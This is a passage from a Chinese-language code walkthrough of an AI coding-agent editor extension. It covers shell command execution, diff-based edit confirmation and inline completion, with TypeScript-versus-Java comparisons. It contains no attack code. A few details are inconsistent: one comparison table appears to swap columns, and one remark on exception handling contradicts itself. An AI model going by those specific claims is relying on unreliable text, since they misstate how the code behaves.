455    private exec(command: string, cwd: string, timeoutSec: number): Promise<string> {
456      // Windows goes through cmd with a UTF-8 code page so Chinese output is readable;
457      // the command string itself is passed verbatim, never rewritten.
458      const line = process.platform === "win32" ? `chcp 65001>nul & ${command}` : command;
459      return new Promise<string>((done, fail) => {
460        const controller = new AbortController();
461        const timer = setTimeout(() => controller.abort(), timeoutSec * 1000);
462        const child = spawn(line, {
463          cwd, shell: true, windowsHide: true, signal: controller.signal,
464        });
465        let captured = "";
466        let settled = false;
...
471        const collect = (chunk: Buffer): void => {
472          if (captured.length >= MAX_CAPTURE_BYTES) return;
473          captured += chunk.toString("utf-8");
474        };
...
479        child.on("error", (error) => {
480          clearTimeout(timer);
481          if (settled) return;
482          settled = true;
483          if (error.name === "AbortError") {
484            const body = captured.trim() ? `\n${truncateOutput(captured.trim())}` : "，无输出";
485            done(`已终止（超时 ${timeoutSec} 秒）${body}`);
486            return;
487          }
488          fail(new Error(`执行失败: ${error.message}`));
489        });
490        child.on("close", (code) => {
491          clearTimeout(timer);
492          if (settled) return;
493          settled = true;
494          const body = captured.trim() === "" ? "（无输出）" : truncateOutput(captured.trim());
495          const status = code === null ? "已终止" : `退出码: ${code}`;
496          const hint = code === null || code === 0 ? "" : "（命令未成功，请根据上面的输出定位原因）";
497          done(`${body}\n${status}${hint}`);
498        });
499      });
500    }
```

📌 **`chcp 65001>nul &`**：Windows 默认代码页是 GBK，`mvn`/`npm` 的中文输出会乱码。先切 UTF-8 再看。`>nul` 把 chcp 自己的输出吞掉。

📌 **超时不算失败**（483-486 行）：返回 `已终止（超时 N 秒）` 加上已捕获的输出，`ok: true`。模型能看到「超时」并自行决定是否重试。Java 侧同样把超时当成功返回（06 卷 §6.3）。

⚠️ **`AbortController` 只能杀直接子进程**：Windows 上 `mvn` 会派生 `java`，`abort()` 后 `java` 可能继续跑，占着端口/文件锁。

🔁 **Java 侧一模一样**：`CommandTools` 超时后只调 `process.destroyForcibly()`（`CommandTools.java:102`、`106`），同样不会杀孙进程。两端都留了这个洞（真正的修法是 `ProcessHandle.descendants()` / `taskkill /T`）。

⚠️ **2 MB 捕获上限会丢掉尾部**（472 行）：注释说「保留尾部」，但 `captured` 一旦满 2 MB 就**停止追加**，所以留下的是**头部** 2 MB，最后 4,800 字符的「尾」其实是 2 MB 附近的中间内容——真正的失败信息在最末尾，已经丢了。正确做法是保留一个滑动窗口（丢掉最老的）。

⚠️ **`captured.length` 是字符数不是字节数**（472 行）：中文命令输出的实际内存是 2~3 倍。

### 8.15 `diagnostics`（410-453 行）

```ts
410    private async diagnostics(args: Record<string, unknown>): Promise<string> {
411      const root = resolve(this.projectRoot);
412      const filter = args.path ? this.resolvePath(args.path) : root;
413      const severityArg = this.stringArg(args, "severity").toLowerCase();
414      const items: DiagnosticItem[] = [];
415      for (const [uri, list] of vscode.languages.getDiagnostics()) {
416        if (uri.scheme !== "file") continue;
417        const fsPath = uri.fsPath;
418        if (fsPath !== root && !fsPath.startsWith(root + sep)) continue;
419        if (fsPath !== filter && !fsPath.startsWith(filter + sep)) continue;
...
427        for (const diagnostic of list) {
428          const severity = diagnostic.severity === vscode.DiagnosticSeverity.Error
429            ? "error"
430            : diagnostic.severity === vscode.DiagnosticSeverity.Warning ? "warning" : null;
431          // Info / hint would drown out the real problems.
432          if (!severity || (severityArg === "error" && severity !== "error")) continue;
433          items.push({ file: label, line: +1, column: +1, severity, message, source });
...
448      items.sort((left, right) => left.file === right.file ? left.line - right.line : left.file.localeCompare(right.file));
449      const truncated = items.length > MAX_DIAGNOSTICS;
450      const kept = truncated ? items.slice(0, MAX_DIAGNOSTICS) : items;
451      return JSON.stringify({ count: kept.length, truncated, items: kept });
452    }
```

| 维度 | 行为 |
|---|---|
| 数据源 | `vscode.languages.getDiagnostics()`（**所有已打开文件的实时诊断**） |
| 范围 | 必须在项目根内，且（若给了 `path`）在 filter 内 |
| 严重级 | 只保留 error / warning；info / hint 丢 |
| 筛选 | `severity: "error"` 时只留 error |
| 排序 | 文件名字典序 → 行号 |
| 截断 | 50 条，`truncated` 标记 |
| 输出 | **JSON 字符串** |

📌 **只对「已打开」的文件有诊断**：`getDiagnostics()` 返回的是语言服务器当前推送的诊断，未打开的文件通常没有。所以 `diagnostics` 的结果强烈依赖用户打开过哪些文件。

🔁 **Java 侧受同样的限制**：`DiagnosticsTools.collect` 遍历的是 `EditorFactory.getInstance().getAllEditors()`，只统计**已加载文档**的 markup（`DiagnosticsTools.java:83-107`，注释也写了「只有 IDE 已分析过的文件才有高亮」）。差异在于：Java 必须先 `invokeAndWait` 到 EDT 再 `runReadAction`（L61-63），TypeScript 的 `getDiagnostics()` 可在任意线程调用。

📌 **JSON 而非文本**：模型可以直接解析 `{count, truncated, items:[{file,line,column,severity,message,source}]}`。Java 侧返回同样形状的 JSON（两端对齐）。

### 8.16 `truncateOutput()`（511-521 行）

```ts
511  function truncateOutput(text: string): string {
512    if (text.length <= MAX_OUTPUT_CHARS) return text;
513    const tailChars = MAX_OUTPUT_CHARS - HEAD_OUTPUT_CHARS;   // 4800
514    const head = text.slice(0, HEAD_OUTPUT_CHARS);            // 3200
515    const tail = text.slice(text.length - tailChars);         // 4800
516    const omitted = text.slice(HEAD_OUTPUT_CHARS, text.length - tailChars).split(/\r?\n/).length;
517    const total = text.split(/\r?\n/).length;
518    return `${head}\n...（中间省略 ${omitted} 行，共 ${total} 行）...\n${tail}`;
519  }
```

📌 **省略行数是「中间段的换行数」**，不是「总数 - 保留数」，因为头尾可能在行中间被切断。

⚠️ **可能把一行切成两半**：`slice` 按字符切，头尾各半行，模型会看到两个残行。Java 的 `CommandTools.truncate` 也是同样的字符切片（`CommandTools.java:169-180`），**两端一致地会切半行**。

---

## 9. `diff.ts` 与 `inline.ts`：两条不经过对话区的旁路

`extension.ts` 激活时干了四件事，其中两件直接和编辑器交互，和「聊天」毫无关系：

```ts
// extension.ts:34-36
34    context.subscriptions.push(new InlineCompletionProvider(() => session?.connection));
35    // Diff confirmation is opened by the tool runner, not registered here.
36    // diff 确认由工具运行时按需打开，这里不做注册。
```

- **`inline.ts`**：向 VS Code 注册 `InlineCompletionItemProvider`，把光标前后文发给 Core 换 FIM 补全。
- **`diff.ts`**：不是扩展点，是 `tools.ts` 在写文件前调用的两个函数（`confirmEdit` / `confirmAction`）。

两者共同的特征：**失败一律静默**。补全失败返回 `undefined`（编辑器什么都不显示），diff 失败返回 `false`（工具报「用户拒绝」）。这符合「编辑器辅助功能不该打断输入」的直觉。

### 9.1 `diff.ts` 全文结构（40 行）

```ts
// diff.ts:1-10
 1  // Diff confirmation for edit tools: show a native diff editor, then ask to apply.
 4  import { mkdirSync, writeFileSync } from "fs";
 5  import { join } from "path";
 6  import { tmpdir } from "os";
 7  import * as vscode from "vscode";
 8  import { autoAcceptEdits } from "./settings";
10  let tempCounter = 0;
```

`tempCounter` 是**模块级可变状态**：整个扩展宿主进程共用，`++tempCounter` 保证同一次会话内的临时文件不重名。进程重启后归零，但 `tmpdir()` 里的旧文件还在 —— 于是新进程会从 `1-xxx.before` 重新开始，**覆盖上一轮的同名临时文件**。覆盖本身无害（都只是 diff 素材），但意味着磁盘上永远只有「最近 1 次运行写过的那批」。

### 9.2 `writeTemp()`（12-19 行）

```ts
12  function writeTemp(side: "before" | "after", label: string, content: string): vscode.Uri {
13    const dir = join(tmpdir(), "agent-coder-diffs");
14    mkdirSync(dir, { recursive: true });
15    const safeLabel = label.replace(/[\\/:*?"<>|]/g, "_").slice(-60);
16    const file = join(dir, `${++tempCounter}-${safeLabel}.${side}`);
17    writeFileSync(file, content, "utf-8");
18    return vscode.Uri.file(file);
19  }
```

逐点拆：

| 行 | 动作 | 说明 |
|---|---|---|
| 13 | `tmpdir()` + `agent-coder-diffs` | Windows 上是 `%TEMP%\agent-coder-diffs`（如 `C:\Users\X\AppData\Local\Temp\...`） |
| 14 | `mkdirSync(recursive)` | 每次都调，`recursive: true` 让已存在不报错；**没有 try**，权限不足时抛异常 → 整个编辑工具失败 |
| 15 | 非法字符替换成 `_` | 覆盖 Windows 文件名禁用字符 `\ / : * ? " < > \|`；`:` 也屏蔽了，避免盘符形态 |
| 15 | `.slice(-60)` | **保留末尾 60 字符**。`tools.ts` 传进来的 `label` 是相对路径（如 `src/main/java/com/x/Foo.java`），替换后变成 `src_main_java_com_x_Foo.java`，取尾部 60 字符 → 前面目录被砍，文件名主体保留 |
| 16 | `${++tempCounter}-${safeLabel}.${side}` | 前缀是**数字**，保证唯一；后缀 `.before` / `.after` |
| 17 | `writeFileSync(..., "utf-8")` | 内容按 UTF-8 落盘 |

📌 **`.slice(-60)` 会切断代理对**：`label` 里如果有 emoji（`emoji_🎉.java`），按 UTF-16 码元切 60 位可能正好把 🎉 的 `\uD83C\uDF89` 切成一半。Node 写路径时会把孤立代理编码成 `U+FFFD`（`EF BF BD`），文件名里出现 `�`。不影响功能（`tempCounter` 仍保证唯一），只是点开 diff 时标题有乱码。

⚠️ **`.before` / `.after` 后缀会让 diff 编辑器丢失语法高亮**：VS Code 按**最后一个**扩展名推断语言，`12-src_main_Foo.java.before` 的扩展名是 `.before`，查不到语言 → 整个 diff 以纯文本渲染，没有配色。想让高亮生效必须写成 `Foo.java~before` 这类不破坏扩展名的形式（或直接给 `vscode.diff` 传 `TextDocumentContentProvider` 的虚拟 URI，并让它 `languageId` 指向原文件）。

⚠️ **临时文件从不清理**：整个 `diff.ts` 没有任何 `unlink`。每执行一次 `write_file` / `edit_file` 就在 `%TEMP%\agent-coder-diffs` 留下 **2 个文件**（`.before` + `.after`），内容是被修改的完整源码。一次长会话改 200 个文件 → 400 个文件、可能几十 MB、且包含用户代码。系统临时目录一般不会被主动清理，等于**代码副本泄漏**到临时区。

### 9.3 `confirmEdit()`（21-35 行）

```ts
21  export async function confirmEdit(label: string, before: string, after: string): Promise<boolean> {
22    if (autoAcceptEdits()) {
23      return true;
24    }
25    const beforeUri = writeTemp("before", label, before);
26    const afterUri = writeTemp("after", label, after);
27    await vscode.commands.executeCommand("vscode.diff", beforeUri, afterUri, `Agent 修改预览: ${label}`);
28    const choice = await vscode.window.showWarningMessage(
29      `Agent 想要修改 ${label}（左侧为原内容，右侧为修改后）。`,
30      { modal: true },
31      "应用",
32      "拒绝",
33    );
34    return choice === "应用";
35  }
```

流程五步：**写两个临时文件 → 打开 diff 标签 → 弹模态框 → 等用户点 → 返回布尔**。

📌 **第 22 行是唯一的「免确认」通道**：`agentCoder.autoAcceptEdits`（`settings.ts:65-67`，默认 `false`）。开启后 `confirmEdit` 直接返回 `true`，**临时文件都不写、diff 不打开、对话框不弹**。此时模型可以连续改写任意文件，唯一的约束只剩 `resolvePath()` 的「不许越出项目根」。

🔁 **Java 侧有同名开关，语义几乎一样，但只覆盖写文件**：`ToolDispatcher.java:67-69`

```java
67        boolean autoAccept = ReportSettingsState.getInstance().autoAcceptEdits;
68        boolean writeOp = WRITE_TOOLS.contains(toolName);
69        boolean needsApproval = !"auto".equals(permission) && !(writeOp && autoAccept);
```

`WRITE_TOOLS` 是 `write_file / edit_file / delete_file / revert_file`（L24-25）。所以 `autoAcceptEdits` **只让写文件工具免确认**，`run_command` 永远按 Core 本次下发的 `permission` 决定（L119 的 `runCommand(args, needsApproval)`）。

TS 侧结构相同：`confirmEdit` 短路（`diff.ts:22-24`），而 `run_command` 走的是 `confirmAction`（`tools.ts:395-402`），它**不读** `autoAcceptEdits`。两边的取舍完全一致：**自动接受只对「模型改文件」生效，对「模型执行命令」不生效**。

📌 `DiffConfirmCard.confirm` 的调用点是 `EditTools.java:45`、`96`、`126`，三个方法都在 `needsApproval` 守卫下；`revertFile`（L117）压根不接收 `needsApproval` —— 但 `revert_file` 在 `WRITE_TOOLS` 里，所以它**会持写锁、不弹确认**。TS 侧 `revert_file` 同样不弹窗（`tools.ts` 的 `revertFile` 直接 `persist`），也不持锁。

⚠️ **第 27 行的 `await` 只保证「标签打开了」，不保证「渲染完了」**：`vscode.diff` 命令返回时编辑器已经创建，但右侧文档内容可能还在异步加载。紧接着的第 28 行模态框会**立刻抢占焦点并遮住编辑器**——尤其在慢机器上，用户可能还没看清 diff 就点了「应用」。Java 的 `DiffConfirmCard` 没有这个问题：diff 文本是**对话框内部**的一个 `JBTextArea`（`DiffConfirmCard.java:31`、`40-45`），用户看到的和确认的是同一块内容，不存在「先弹框后渲染」的时序缝隙。

⚠️ **`before` 的内容可能本来就是乱码**：`tools.ts` 用 `fs.readFile(path, "utf-8")` 读原文件（`tools.ts:313`、`330`），GBK 文件读出来已经是 `�`，再写进 `.before` 临时文件。所以 diff 左侧显示的是乱码，右侧（模型给的 UTF-8 文本）是正常的 —— 用户点「应用」之前看到的「原内容」并不可信。

📌 **取消不打折**：用户按 Esc 或点关闭 → `showWarningMessage` 返回 `undefined` → `undefined === "应用"` 为假 → 返回 `false` → 工具抛「用户拒绝」。**fail-safe 方向是对的**（默认不动文件）。

📌 **diff 标签不会被关闭**：`confirmEdit` 返回后那个 `Agent 修改预览: xxx` 标签仍在编辑器里。用户每确认一次就多一个标签页，需要手动关。这不是 bug（有些用户想留着看），但和「一次性确认框」的直觉不符。

### 9.4 `confirmAction()`（37-40 行）

```ts
37  export async function confirmAction(message: string): Promise<boolean> {
38    const choice = await vscode.window.showWarningMessage(message, { modal: true }, "允许", "拒绝");
39    return choice === "允许";
40  }
```

只有两句：一个模态警告框，一个布尔。调用点有三处：

| 调用点 | 场景 | 文案来源 |
|---|---|---|
| `tools.ts:359` | `delete_file` | `Agent 想要删除 X，是否允许？` |
| `tools.ts:396` | `run_command`（非 auto） | `Agent 请求在 X 执行命令：\n\n<cmd>\n\n允许后才会运行。` |
| `tools.ts` 的 `onToolInvoke` | `tool/confirm` 类工具 | Core 下发的 `summary` |

📌 **`{ modal: true }` 是必须的**：非模态通知会在几秒后自动消失，而这里必须**阻塞到用户明确回答**——否则 `await` 会在用户没看见时就拿到 `undefined`，等于「静默拒绝」。模态框保证一定有返回值。

⚠️ **模态框期间整个 VS Code 窗口不可交互**：`showWarningMessage(modal)` 是应用级模态。如果此时用户正在另一个编辑器里打字，输入会丢。Java 的 `DialogWrapper` 也是模态，但 `ProjectWriteGate` 会在弹窗期间**持锁**（08 卷 §13.2），保证不会出现「两个弹窗叠在一起」；TS 没有锁，两个并发工具调用会**弹出两个模态框**，第二个在第一个关闭后才出现（VS Code 会排队）。

### 9.5 原生 diff vs 自绘 diff

| 维度 | VS Code `diff.ts` | Java `DiffConfirmCard` |
|---|---|---|
| diff 算法 | **VS Code 内置**（成熟的 Myers / 字符级） | **自研**：只裁公共前后缀，中间整块标 `-` / `+`（L62-88） |
| 展示位置 | 独立编辑器标签（可滚动、可折叠、可并排/内联切换） | 对话框内 `JBTextArea`，900×520 固定大小（L44） |
| 上下文行数 | 编辑器自带（默认 3 行以上，可配置） | 写死 `context = 3`（L74） |
| 行数上限 | 无（引擎自己处理） | `MAX_DIFF_LINES = 800`（L19），超出截断并提示总行数（L98-104） |
| 新文件 / 删除 | 左侧空 / 右侧空，引擎正常渲染 | 显式加一行 `+（新文件）` / `-（删除文件）`（L91-95） |
| 临时文件 | **必须写盘**（2 个/次） | 全在内存 |
| 清理 | **无** | 不需要 |
| 阻塞方式 | `invokeAndWait` 到 EDT + `showAndGet()` | `await showWarningMessage(modal)` |
| 免确认开关 | `agentCoder.autoAcceptEdits`（写文件短路） | `ReportSettingsState.autoAcceptEdits`（同样只免写文件，`ToolDispatcher.java:67-69`） |
| 语法高亮 | **丢失**（`.before` 后缀破坏扩展名） | 无高亮（纯文本 `JBTextArea`），但字体是等宽 |

📌 **Java 的「自研 diff」其实不是 diff**：`renderDiff` 只做「找公共前缀 / 公共后缀 → 中间整块删、整块加」。对 `edit_file` 这种**局部替换**是够用的（改的就是一小段），但对 `write_file` 整文件重写会退化成「删掉全部 + 加回全部」。这在小文件上可读，在 800 行的文件上就是两屏红绿。VS Code 的原生 diff 在这种情况下体验明显更好。

### 9.6 `inline.ts` 常量（7-11 行）

```ts
 7  const DEBOUNCE_MS = 300;
 8  const TIMEOUT_MS = 1500;
 9  const MAX_FILE_BYTES = 512 * 1024;
10  const MAX_PREFIX_CHARS = 4000;
11  const MAX_SUFFIX_CHARS = 1200;
```

与 Java 侧逐项对比：

| 常量 | TypeScript | Java（`AgentInlineCompletionProvider.kt`） |
|---|---|---|
| 防抖 | `DEBOUNCE_MS = 300`（L7） | `DEBOUNCE = 300.milliseconds`（L75） |
| 超时 | `TIMEOUT_MS = 1500`（L8），在**壳**上做 | `TIMEOUT_MS = 1500`（`InlineCompletionClient.java:18`），在**壳**上做 |
| 文件上限 | `512 * 1024`，比较 `text.length`（**UTF-16 码元**） | `512L * 1024L`，比较 `file.length`（**字节**） |
| 前文 | 4000 字符（L10） | `MAX_PREFIX_CHARS = 4000`（L76） |
| 后文 | 1200 字符（L11） | `MAX_SUFFIX_CHARS = 1200`（L77） |

📌 **四个数字全部一致不是巧合**：Core 侧的 `completion.py:17-18` 也写死了同一组 `MAX_PREFIX_CHARS = 4000` / `MAX_SUFFIX_CHARS = 1200` 再裁一次。壳裁是为了**少传数据**，Core 裁是为了**不信任壳**（壳可能被改，或者换了别的壳）。裁两次结果不同时才见真章：

```python
# completion.py:46-47
46      prefix = (prefix or "")[-MAX_PREFIX_CHARS:]   # 取末尾
47      suffix = (suffix or "")[:MAX_SUFFIX_CHARS]    # 取开头
```

TS 壳 `inline.ts:49` 已经是 `text.slice(Math.max(0, offset - 4000), offset)`（末尾），`L53` 是 `text.slice(offset, offset + 1200)`（开头）——**语义完全对齐**。所以 Core 的那次裁剪对这两个壳都是 no-op，它只是给未来/第三方壳兜底。

⚠️ **`MAX_FILE_BYTES` 的名字在 TS 里是错的**：`text.length` 数的是 UTF-16 码元。一个 512 KB 的**中文**文件（UTF-8 三字节/字）→ `text.length ≈ 175,000`，远小于 `512 * 1024`，会被**放行**；反过来，一个 500 KB 的纯 UTF-8 英文文件 `text.length ≈ 500,000` 会被拒绝。所以 TS 的真实阈值是「约 512K 个 UTF-16 码元」，Java 的是「512 KB 字节」。前端放行 → 后端 `completion.py` 不再判大小（它只裁前后文），于是**一个 1.5 MB 的中文文件也被补全**，只是前后文各被裁到 4000/1200 字符。

### 9.7 注册（13-18 行）

```ts
13  export class InlineCompletionProvider implements vscode.InlineCompletionItemProvider, vscode.Disposable {
14    private readonly registration: vscode.Disposable;
15
16    constructor(private readonly connection: () => RpcConnection | undefined) {
17      this.registration = vscode.languages.registerInlineCompletionItemProvider({ pattern: "**" }, this);
18    }
```

📌 **构造函数里注册、`dispose` 里注销**：这是 VS Code 扩展的标准写法，`extension.ts:34` 把它塞进 `context.subscriptions`，扩展停用时自动 `dispose`。

📌 **`connection` 是函数而不是对象**（16 行）：`() => RpcConnection | undefined`。这样 provider 能在**每次请求时**拿到「当前」连接——Core 崩溃重启后 `session.connection` 会变，闭包保证拿到的永远是最新值。如果这里传的是快照对象，重启后补全会永久失效。

⚠️ **`{ pattern: "**" }` 注册到了所有文件**：包括二进制、日志、`.min.js`、50 MB 的 JSON。过滤全靠 `provideInlineCompletionItems` 里的 4 道检查（见 9.8）。VS Code 官方建议用 `DocumentFilter` 精确到 `language`，否则每次切换到大文件都会先进一次 provider（读全文）再被丢弃。

🔁 **Java 侧用 `isEnabled()` 提前过滤**（`AgentInlineCompletionProvider.kt:28-35`）：先看设置开关，再看 `virtualFile` 是否为本地目录——**在读取文件内容之前**就决定跳过。TS 的等价检查在 9.8，时机相同（provider 被调用之后），但多了一次 `document.getText()`（见 9.8 的 ⚠️）。

### 9.8 前置过滤（29-46 行）

```ts
29    const config = vscode.workspace.getConfiguration("agentCoder");
30    if (!config.get<boolean>("inlineCompletion.enabled", true)) {
31      return undefined;
32    }
33    if (document.uri.scheme !== "file" || document.uri.fsPath.length === 0) {
34      return undefined;
35    }
39    const text = document.getText();
40    if (text.length > MAX_FILE_BYTES || text.includes("\u0000")) {
41      return undefined;
42    }
43    const connection = this.connection();
44    if (!connection) {
45      return undefined;
46    }
```

四道闸，顺序有讲究：

| 顺序 | 检查 | 为什么在这个位置 |
|---|---|---|
| 1 | 设置开关（30） | 最便宜，一次 config 查表 |
| 2 | `scheme === "file"`（33） | 排除 `untitled:`、`output:`、`git:`、`vscode-settings:` 等虚拟文档 |
| 3 | 大小 + NUL（40） | **一次扫描同时判两件事**（注释 L36-38 明确说了） |
| 4 | 连接存在（43） | 最后才取闭包，避免无谓调用 |

📌 **第 33 行的 `scheme` 判断等价于 Java 的 `isInLocalFileSystem`**（`AgentInlineCompletionProvider.kt:34`）：都只放行「真实磁盘文件」。Java 还额外排除目录（`!file.isDirectory`），TS 侧目录根本打不开成文档，不需要判。

📌 **一次扫描判两件事（40 行）**：`text.length > MAX_FILE_BYTES || text.includes("\u0000")`。`includes` 是 `O(n)` 但提前返回，绝大多数文件很快命中或扫完。二进制文件几乎必然含 `\0`，而大文件靠长度拦——两条判断覆盖了「不该送进模型」的全部情况。

⚠️ **第 39 行每次按键都 `document.getText()`**：这会把**整个文档**复制成一个新 JS 字符串。512 KB 的中文文件 → 约 1.5 MB 的 UTF-16 内存（2 字节/码元）→ 每次按键分配 1 MB 级别的临时字符串。用户连续输入时 GC 压力明显。Java 侧只读 `file.length`（`AgentInlineCompletionProvider.kt:42`）——**VFS 的长度是缓存的，不读文件内容**；只有通过大小检查后才用 `document.getText(TextRange)` 读**两个小片段**（L48-55）。这是 TS 与 Java 在补全路径上最实质的性能差距。

### 9.9 取前后文（48-53 行）

```ts
48      const offset = document.offsetAt(position);
49      const prefix = text.slice(Math.max(0, offset - MAX_PREFIX_CHARS), offset);
50      if (!prefix.trim()) {
51        return undefined;
52      }
53      const suffix = text.slice(offset, offset + MAX_SUFFIX_CHARS);
```

📌 **`prefix.trim()` 为空就放弃**（50-51）：文件开头、纯空行处不补全。原因在 Core：`completion.py:48-49` 也有同样的判断，没有上下文时 FIM 模型只会瞎猜。

📌 **`suffix` 没有同样的非空检查**：光标在文件末尾时 `suffix = ""` 是合法的（纯续写），Core 支持 `suffix` 为空（`complete(config, prefix, "")`）。

⚠️ **`slice` 可能切断代理对**（49、53 行）：如果 `offset - 4000` 正好落在某个 emoji 中间，`prefix` 的第一个「字符」是孤立的高位代理。这个字符串会被 `JSON.stringify` 成 `"\ud83c"`（合法 JSON 转义），Python 的 `json.loads` 能解析成孤立代理字符串，`complete()` 会把它塞进 HTTP body → `httpx` 用 UTF-8 编码时**抛 `UnicodeEncodeError`**。

`completion.py:55-58` 的 `except (httpx.HTTPError, ValueError, KeyError, TypeError)` **捕获不到它**——`UnicodeEncodeError` 是 `ValueError` 的子类，**能**捕获。所以这一层是安全的，返回 `""`（空补全），用户什么都看不到。

### 9.10 防抖（55-65 行）

```ts
55    // Automatic triggers wait out the debounce and drop stale requests; an explicit
58    if (context.triggerKind === vscode.InlineCompletionTriggerKind.Automatic) {
59      if (!(await sleep(DEBOUNCE_MS, token))) {
60        return undefined;
61      }
62    }
63    if (token.isCancellationRequested) {
64      return undefined;
65    }
```

📌 **只有 `Automatic` 才等 300ms**（58 行）：用户打字触发的补全先睡 300ms，如果这期间又敲了键，VS Code 会 `cancel` 上一个 token，`sleep` 返回 `false` → 直接退出。**手动触发（`Invoke`，Ctrl+Space）立即发请求**，不能再等——用户已经在等结果了。

🔁 **Java 的防抖在框架层**：`DebouncedInlineCompletionProvider` 由平台负责「攒 300ms 再调 `getSuggestionDebounced`」，`getDebounceDelay()` 只返回时长（`AgentInlineCompletionProvider.kt:37`）。TS 没有这个框架能力，只能自己 `sleep`。

两者语义有一处**细微差别**：

| | Java（框架防抖） | TS（自己 sleep） |
|---|---|---|
| 300ms 内新按键 | 框架**丢弃**旧请求，不进入 provider | provider **已经进入**，在 `await sleep` 里等着，靠 token 取消退出 |
| 取消后的开销 | 无 | 每次按键创建一个 Promise + 一个 `setTimeout` + 一个 token 监听 |

影响可忽略（都是内存操作），但这也是**为什么 TS 版必须在 `sleep` 里监听 token**——不监听的话，300ms 后每个过期请求都会真的发出去。

### 9.11 发请求 + 超时（67-77 行）

```ts
67    const response = await withTimeout(connection.request("inline/complete", {
68      prefix,
69      suffix,
70      language: document.languageId,
71      path: document.uri.fsPath,
72    }), TIMEOUT_MS);
73    // A newer keystroke may have arrived while the model was thinking.
75    if (!response || token.isCancellationRequested) {
76      return undefined;
77    }
```

📌 **`language: document.languageId`** 会传给 Core（`server.py:382`），但 `completion.py` **压根不用这个参数**——`complete(config, prefix, suffix, language, max_tokens)` 签名里有 `language`，函数体里没引用（L43-59）。所以两端都在传一个被忽略的字段。（真正影响输出的是 `config.provider` 决定走 Ollama 还是 OpenAI 的 FIM 端点。）

📌 **`path` 也一样被忽略**：`server.py:378-384` 只取 `prefix` / `suffix` / `language` / `maxTokens`，`path` 连读都没读。Java 侧同样传了（`InlineCompletionClient.java:39`）。这个字段是为「将来按文件类型切换提示词」预留的，目前是死参数。

⚠️ **1.5s 超时放弃 ≠ 取消 Core 的计算**：`withTimeout` 只是让自己不再等，Core 侧的 `_run_inline` 还在跑，最长 **12 秒**（`server.py:385` 的 `timeout=12.0`），而它内部 `httpx` 的 read 超时是 8 秒（`completion.py:16`）。用户打字快时，`Automatic` 触发约每 300ms 一次 → 如果模型慢（本地 7B 模型一次 FIM 常要 1-3 秒），会有**多个请求同时在 Core 里排队**。Core 没有「同一个位置只保留最新请求」的机制（`_run_inline` 是独立 `create_task`，`server.py:233-235`），Ollama 侧会串行处理，越积越多。

⚠️ **超时后 pending 不会立刻清掉**：`rpc.ts:119` 把 `resolve/reject` 存进 `this.pending`，只有 `dispatch`（L100-111）或 `exit` 才会 `delete`。`withTimeout` 放弃等待**不影响**这张表，所以每个超时请求在 `pending` 里多留一段时间——直到 Core 的响应回来（≤12s）才被删掉。只有 Core 真的挂了（帧永远不来）才会永久残留。

### 9.12 处理结果（78-82 行）

```ts
78      const answer = response.result?.text;
79      if (typeof answer !== "string" || !answer.trim()) {
80        return undefined;
81      }
82      return [new vscode.InlineCompletionItem(answer, new vscode.Range(position, position))];
```

📌 **`response.result?.text`**：`rpc.ts:110` resolve 的是**整个 envelope**（`{id, ok, result}`），不是 `result` 本身。Core 的回包是 `make_response(req_id, {"text": text})`（`server.py:387`），所以路径是 `response.result.text` —— 正确。Java 侧做的是同一件事但更啰嗦（`InlineCompletionClient.java:43-48`：先判 `ok`，再判 `result` 是对象，再取 `text`）。TS 靠 `rpc.ts:106` 已经把 `ok === false` 转成 reject，所以这里不必再判 `ok`。

📌 **`typeof answer !== "string"`**（79）：防御 `text` 字段缺失、是 `null`、或 Core 版本不匹配时返回了别的形状。

📌 **`!answer.trim()`**（79）：全空白也算「没有补全」。否则编辑器会插入一堆空格。

📌 **插入范围是 `new Range(position, position)`**（82）：零宽区间 = **在光标处插入**，不替换任何已有字符。这是 ghost text 的正确语义。

⚠️ **`InlineCompletionItem(answer, ...)` 直接传字符串，不做多行缩进对齐**：VS Code 会把 `answer` 里的 `\n` 原样插入，**不会**按当前行的缩进重新对齐后续行。所以模型返回：

```
if (x) {\n    return 1;\n}
```

在缩进 2 空格的代码里会被插成「第一行对齐、后两行绝对缩进 4 空格」——相对缩进是保留的，但绝对基线错位。专业补全插件会用 `vscode.InlineCompletionItem.insertText = new vscode.SnippetString(...)` 配合 `$TM_INDENT` 处理。Java 的 `InlineCompletionTextElement(text, attributes)`（`AgentInlineCompletionProvider.kt:70`）由平台处理缩进，没这个问题。

📌 **只返回一条候选**：`[item]` 长度恒为 1。VS Code 支持返回多条（用 `Tab` / `Alt+]` 切换），TS 版没做——因为 Core 的 FIM 端点一次只返回一个候选（`completion.py:112-115` 取 `choices[0]`）。

### 9.13 `sleep()`（91-106 行）

```ts
91  function sleep(ms: number, token: vscode.CancellationToken): Promise<boolean> {
92    return new Promise<boolean>((resolve) => {
93      if (token.isCancellationRequested) {
94        resolve(false);
95        return;
96      }
97      const timer = setTimeout(() => {
98        subscription.dispose();
99        resolve(!token.isCancellationRequested);
100     }, ms);
101     const subscription = token.onCancellationRequested(() => {
102       clearTimeout(timer);
103       resolve(false);
104     });
105   });
106 }
```

📌 **返回 `boolean` 而不是 `void`**：调用方要知道「是睡满了还是被取消」。睡满且期间没取消 → `true`；被取消 → `false`。

📌 **第 99 行再检查一次 token**：`setTimeout` 到期时，可能刚好在到期前一刻用户按了键但 `onCancellationRequested` 还没触发。`!token.isCancellationRequested` 兜住这个竞态。

⚠️ **取消路径没有 `dispose()` 订阅**（101-104 行）：`token.onCancellationRequested` 返回的 `Disposable` 在取消回调里没有被 dispose。正常情况下 token 属于一次补全请求，请求结束由 VS Code 回收；但如果同一个 token 上注册了多个监听器，未 dispose 的那个会一直挂着（直到 token 源被销毁）。影响很小，属于「能让代码更严谨」的量级。

⚠️ **`subscription` 是 `const` 但在 `setTimeout` 回调里被引用**（98 行）：这里依赖了 `const` 的 TDZ——`setTimeout` 的回调在**至少 `ms` 毫秒后**才执行，那时 `subscription` 早已赋值完毕。如果 `ms` 为 0（本文件不会），会抛 `ReferenceError`。写法是对的，但很依赖「回调一定异步」这个前提。

### 9.14 `withTimeout()`（109-123 行）

```ts
109 function withTimeout<T>(promise: Promise<T>, ms: number): Promise<T | undefined> {
110   return new Promise<T | undefined>((resolve) => {
111     const timer = setTimeout(() => resolve(undefined), ms);
112     promise.then(
113       (value) => { clearTimeout(timer); resolve(value); },
117       () => { clearTimeout(timer); resolve(undefined); },
121     );
122   });
123 }
```

📌 **同时吞掉「超时」和「失败」**（111 与 117-120）：两种情况都 `resolve(undefined)`，调用方只需判 `if (!response)`。这样 `inline.ts` 里**永远不会有 unhandled rejection**——这是补全功能必须的（Core 崩了不能弹红框）。

